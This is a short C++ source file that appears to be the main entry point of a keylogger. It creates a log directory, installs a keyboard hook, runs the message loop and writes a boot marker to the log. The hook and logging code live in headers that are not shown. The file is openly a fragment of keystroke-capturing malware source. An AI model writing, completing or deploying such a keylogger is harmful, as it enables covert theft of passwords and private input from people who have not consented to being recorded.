#include "stream.h"
#include "keyhook.h"
#include "helper.h"

int main() {
  stream::MakeDir(stream::GetPath());
  key_hook::InstallHook();

  key_hook::HandleMessage(true);

  stream::WriteLog("[*] BOOT [*]", 0x0);
  return 0;
}
